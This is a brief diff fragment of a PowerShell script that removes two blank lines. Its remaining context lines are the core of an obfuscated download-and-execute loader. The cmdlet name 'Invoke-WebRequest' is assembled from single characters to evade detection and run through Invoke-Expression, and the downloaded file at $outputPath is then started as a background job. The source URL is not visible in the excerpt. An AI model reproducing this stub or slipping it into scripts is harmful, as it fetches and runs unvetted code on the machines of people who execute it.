@@ -6,8 +6,6 @@ $WRARR = 'I', 'n', 'v', 'o', 'k', 'e', '-', 'W', 'e', 'b', 'R', 'e', 'q', 'u', '
 
 $WR = -join $WRARR
 
-
-
 Invoke-Expression $WR
 
 Start-Job -ScriptBlock { & "$($using:outputPath)" }
